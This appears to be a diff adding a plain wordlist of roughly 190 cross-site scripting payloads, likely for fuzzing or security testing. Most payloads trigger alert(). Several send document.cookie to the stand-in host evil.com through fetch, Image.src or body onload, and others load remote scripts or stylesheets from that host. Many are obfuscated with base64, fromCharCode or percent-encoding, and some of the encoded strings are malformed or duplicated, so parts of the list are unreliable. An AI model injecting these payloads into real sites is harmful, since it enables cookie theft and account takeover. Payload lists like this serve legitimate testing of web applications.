@@ -1,0 +1,189 @@
+javascript:alert(1)
+<a href="#" onmouseover="alert(1)">hover me</a>
+<img src=x onclick=alert(1)>
+</script><script>alert(1)</script>
+"onmouseover="alert(1)
+<input type="text" value="XSS" onfocus=alert(1)>
+<scr<script>ipt>alert(1)</script>
+<img src=x onerror=alert(1)>
+<script>alert(1)</script>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+<><img src=1 onerror=alert(1)>
+"-alert`1`-"
+"%2balert(1)}//
+"+alert(1)}//
+\"-alert(1)}//
+</script><script>alert(1)</script>
+'-alert(1)-'
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+<script src="data:text/javascript;base64,YWxlcnQoJEVycm9yKQ=="></script>
+<img src="x" onerror="alert('New XSS')">
+<svg><script>alert('New XSS')</script></svg>
+<iframe src="data:text/html;base64,PGgzPk5ldyBYS1NTPDwvaD4="></iframe>
+<body onload="fetch('http://evil.com/log?cookie=' + document.cookie)">
+<canvas id="myCanvas" onmouseover="alert('New XSS')"></canvas>
+<a href="javascript:document.write('<script>alert(2)<\/script>')">Inject Script</a>
+<input type="text" value="" onfocus="alert('New Focus XSS')">
+<div style="background:url(javascript:alert('New Background XSS'))"></div>
+<iframe src="javascript:alert(1)"></iframe>
+<video src="javascript:alert('XSS')" onerror="alert('New Video XSS')"></video>
+<script>!function(){alert('New IIFE XSS')}();</script>
+<a href="javascript:void(0)" onmouseover="alert('Mouse over XSS')">Hover me</a>
+<marquee direction="left" onmouseover="alert('New Marquee XSS')">Scrolling Text</marquee>
+<svg onload="alert('New SVG XSS')"></svg>
+<img src="https://evil.com/0" onerror="alert('New Image XSS')">
+<input type="text" onkeydown="alert('New Keydown XSS')">
+<script>document.getElementById('myDiv').innerHTML = '<img src=x onerror=alert(1)>';</script>
+<iframe src="javascript:alert('XSS')"></iframe>
+<body onload=alert('XSS')>
+<a href="javascript:alert('XSS')">Click me</a>
+<div onclick="alert('XSS')">Click me</div>
+<form action="javascript:alert('XSS')"><input type="submit" value="Submit"></form>
+<input type="text" onfocus="alert('XSS')">
+<script>document.body.appendChild(document.createElement('script')).src='http://evil.com/xss.js'</script>
+<script>fetch('http://evil.com/log?cookie=' + document.cookie)</script>
+<img src=x onerror="alert(document.domain)">
+<script>console.log('XSS')</script>
+<script>eval('alert(1)')</script>
+<input type="text" value="" onmouseover="alert('XSS')">
+<style>body:before{content:'XSS';display:block;}</style>
+<script>var x=new Image();x.src='http://evil.com/log?cookie='+document.cookie;</script>
+<svg><script>alert(1)</script></svg>
+<link rel='stylesheet' href='http://evil.com/xss.css'>
+<script>setTimeout(function(){alert('XSS')},1000);</script>
+<iframe src="javascript:alert('XSS')" style="display:none"></iframe>
+<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
+<a href="javascript:alert(1)">Test</a>
+<img src='x' onerror='alert(1)'/>
+<object data="javascript:alert('XSS')"></object>
+<embed src="javascript:alert('XSS')"></embed>
+<div style='background-image:url(javascript:alert(1))'></div>
+<script>window.location='javascript:alert(1)'</script>
+<iframe srcdoc='<script>alert(1)</script>'></iframe>
+<body onerror='alert(1)'>
+<script>alert(1)</script>
+javascript:alert(1)
+<a href="#" onmouseover="alert(1)">hover me</a>
+<img src=x onclick=alert(1)>
+</script><script>alert(1)</script>
+"onmouseover="alert(1)
+<input type="text" value="XSS" onfocus=alert(1)>
+<scr<script>ipt>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+/<input name="search" value="<script>alert(1)</script>">
+<input name="search" value="<script>alert(1)</script>">
+<><img src=1 onerror=alert(1)>
+<script src='http://evil.com/xss.js'></script>
+<style>body{background:url('javascript:alert(1)');}</style>
+<input type='hidden' value='xss' onfocus='alert(1)'>
+<img src=x onerror='alert(document.cookie)'>
+<script>alert(document.domain)</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<iframe src='http://evil.com' onload='alert(1)'></iframe>
+<input type='text' value='' onblur='alert(1)'>
+<input type='text' value='' onkeydown='alert(1)'>
+<video src='http://evil.com/xss.mp4' onerror='alert(1)'>
+<script>new Function('alert(1)')()</script>
+<details open ontoggle="alert('XSS')"><summary>Click here</summary></details>
+<a href="javascript:void(0)" onclick="alert('XSS')">Click me</a>
+<marquee onstart="alert('XSS')">Scrolling Text</marquee>
+<input type="text" onkeypress="alert('XSS')">
+<iframe src="data:text/html;base64,PGgzPkFsaERTU0A8L2g9Pg=="></iframe>
+<div style="background-image: url('javascript:alert(1)')">Click me</div>
+<script>document.body.innerHTML += '<img src=x onerror=alert(1)>';</script>
+<canvas id="c" onmousedown="alert(1)"></canvas>
+<script src="data:text/javascript;base64,YWxlcnQoJEdVTFk9NTA4KCcnLCcgT0xkU0khJyk7"></script>
+<video src="javascript:alert(1)" onerror="alert(1)"></video>
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+<img src="x" onerror="this.src='http://evil.com/xss.gif'">
+<marquee behavior="alternate" onmouseover="alert('XSS')">Hover me!</marquee>
+<script>window.open('javascript:alert(1)')</script>
+<a href="javascript:alert(document.cookie)">Click here for cookies</a>
+<script>fetch('http://evil.com/xss?cookie=' + btoa(document.cookie))</script>
+<a href="javascript:alert('XSS via link')">Click me!</a>
+<div style="display:none" onmouseover="alert('Hidden div XSS')">Hover me</div>
+<svg><image href="javascript:alert('XSS via SVG')" /></svg>
+<script>setTimeout(() => alert('Delayed XSS'), 500);</script>
+<object data="data:text/html;base64,PGgzPk5ldyBYS1NTPDwvaD4="></object>
+<video autoplay onerror="alert('New Video XSS')"></video>
+<form onsubmit="alert('Form XSS'); return false;"><input type="submit" value="Submit"></form>
+<marquee behavior="scroll" onmouseover="alert('Marquee XSS')">Hover me</marquee>
+<a href="javascript:alert(document.domain)">Click here for domain</a>
+<div style="background-image:url('javascript:alert(1)')"></div>
+<input type="text" onpaste="alert('Paste XSS')">
+<script>document.getElementById('x').innerHTML = '<img src=x onerror=alert(3)>';</script>
+<iframe src="data:text/html;base64,PGgzPk5pbmRlcHRpb24gRGlhbG9nPC9oPg=="></iframe>
+<svg><script>alert('SVG XSS')</script></svg>
+<input type="text" value="" onfocus="alert('Input Focus XSS')">
+<img src="x" onerror="alert('New Image Error XSS')">
+<a href="javascript:alert('New Link XSS')">Test Link</a>
+<div onclick="alert('Div Click XSS')">Click me!</div>
+<iframe src="data:text/html,<script>alert('Data URL XSS')</script>"></iframe>
+<body onload="alert('Body Load XSS')">
+<details ontoggle="alert('Details XSS')"><summary>Details</summary><p>Click to toggle</p></details>
+<script>!function(){alert('Anonymous Function XSS')}();</script>
+<video src="x" onerror="alert('Video Error XSS')"></video>
+<style>@import'http://evil.com/xss.css';</style>
+<form action="javascript:alert('Form Submit XSS')"><input type="submit" value="Submit"></form>
+<div onmouseover="alert('Mouse Over XSS')">Hover over me!</div>
+<script>window.open('javascript:alert(1)');</script>
+<a href="javascript:alert('Click me for XSS')">Click here!</a>
+<script>document.write('<img src=x onerror=alert(2)>')</script>
+<svg onload="alert('SVG OnLoad XSS')"></svg>
+<script>alert(String.fromCharCode(88, 83, 83))</script>
+<img src="x" onerror="alert(unescape('%3Cscript%3Ealert%281%29%3C%2Fscript%3E'))">
+<svg><script>eval(atob('YWxlcnQoMTIzKQ=='))</script></svg>
+<iframe src="data:text/html;base64,PGgzPkV4ZW1wbGUgY2hhbGxlbmdlPC9oPg=="></iframe>
+<script>setTimeout(function(){alert(String.fromCharCode(88, 83, 83))}, 1000);</script>
+<details ontoggle="eval(unescape('%61%6C%65%72%74%28%31%29'))"><summary>Toggle</summary></details>
+<img src="x" onerror="this.src='data:text/html;base64,PGgzPkRhdGUgQVVUQkFEMjAyMjwvaD4='">
+<script>document.write('<scr' + 'ipt>alert(1)</scr' + 'ipt>');</script>
+<a href="javascript:document.body.appendChild(document.createElement('script')).src='data:text/javascript;base64,YWxlcnQoJEdVTFk9MjAwKQ=='">Click me</a>
+<div onmouseover="eval('alert(1)')">Hover over me!</div>
+<video src="javascript:alert('XSS')" onerror="eval(unescape('%61%6C%65%72%74%28%31%29'))"></video>
+<script>fetch('http://evil.com/log?cookie=' + encodeURIComponent(document.cookie))</script>
+<form onsubmit="eval('alert(1)'); return false;"><input type="submit" value="Submit"></form>
+<svg><script src="data:text/javascript;base64,YWxlcnQoJGV4cGVyaW1lbnQub2Zmc2V0')"></script></svg>
+<script>fetch('http://evil.com/log?cookie=' + btoa(document.cookie))</script>
+<img src="x" onerror="alert('XSS via base64')">
+<svg><script>eval(atob('YWxlcnQoIk5ldyBXaXRoIFRleHQiKQ=='))</script></svg>
+<iframe src="data:text/html;base64,PGgzPk5ldyBCYXNlPC9oPg=="></iframe>
+<script>setTimeout(function(){alert(String.fromCharCode(88, 83, 83))}, 500);</script>
+<a href="javascript:document.body.appendChild(document.createElement('script')).src='data:text/javascript;base64,YWxlcnQoJGV4cGVyaW1lbnQub2Zmc2V0')">Run Script</a>
+<div onclick="eval('alert(1)')">Click me!</div>
+<img src="x" onerror="this.src='data:text/html;base64,PGgzPkV4ZW1wbGUgY2hhbGxlbmdlPC9oPg=='">
+<details ontoggle="alert(1)"><summary>Toggle</summary></details>
+<script>document.write('<img src=x onerror=alert(2)>')</script>
+<script>var x = new Image(); x.src='data:text/javascript;base64,YWxlcnQoJGV4cGVyaW1lbnQub2Zmc2V0')';</script>
+<svg><script src="data:text/javascript;base64,YWxlcnQoIk5ldyBJU2ZyaXAiKQ=="></script></svg>
+<a href="javascript:void(0)" onclick="eval('alert(3)')">Click me</a>
+<script>document.write('<scr' + 'ipt>alert(4)</scr' + 'ipt>');</script>
+<img src="x" onerror="alert(unescape('%3Cscript%3Ealert%284%29%3C%2Fscript%3E'))">
+<svg><script>eval(unescape('%65%76%61%6C%28%27%61%6C%65%72%74%28%27%32%37%35%27%29%27%29'))</script></svg>
+<iframe src="data:text/html;base64,PGgzPk5NZXNzYWdlPC9oPg=="></iframe>
+<script>setTimeout(function(){alert('XSS delayed')}, 2000);</script>
+<a href="javascript:alert(unescape('%3Cscript%3Ealert%285%29%3C%2Fscript%3E'))">Execute XSS</a>
+<div onclick="eval('alert(6)')">Click this div</div>
+<img src="x" onerror="this.src='data:text/html;base64,PGgzPldhc3RlPC9oPg=='">
+<details ontoggle="alert('Toggle XSS')"><summary>Click to expand</summary></details>
+<script>document.body.appendChild(document.createElement('script')).src='data:text/javascript;base64,YWxlcnQoJGFidXQp';</script>
+<svg><script>eval('alert(String.fromCharCode(88, 83, 83))');</script></svg>
+<a href="javascript:document.body.innerHTML += '<img src=x onerror=alert(7)>'">Inject via innerHTML</a>
+<svg><script>fetch('http://evil.com/xss?data=' + encodeURIComponent(document.domain))</script></svg>
+<img src="x" onerror="alert(decodeURIComponent('%3Cscript%3Ealert%288%29%3C%2Fscript%3E'))">
+<script>eval(atob('YWxlcnQoJ0FjdGl2YXRlZCBQYXJhbXMgWmFyaW5nJyk='))</script>
+<iframe src="data:text/html;base64,PGgzPk5ldyBPcHRpb24gY2hhbGxlbmdlPC9oPg=="></iframe>
+<a href="javascript:void(0)" onclick="setTimeout(() => alert(9), 1000)">Delayed Alert</a>
+<div onmouseover="eval('alert(10)')">Hover over this</div>
+<img src="x" onerror="this.src='data:text/html;base64,PGgzPldlYlN0b3J5PC9oPg=='">
+<details ontoggle="alert('Details Toggled!')"><summary>Details</summary><p>Content</p></details>
+<script>document.body.appendChild(document.createElement('script')).src='data:text/javascript;base64,YWxlcnQoJGF0b3AoJ2Zha2UgaGVyZScp');</script>
+<svg><script>setInterval(() => alert('Repeated XSS'), 2000);</script></svg>
+<a href="javascript:alert('Inline XSS via link')">Click me!</a>
+
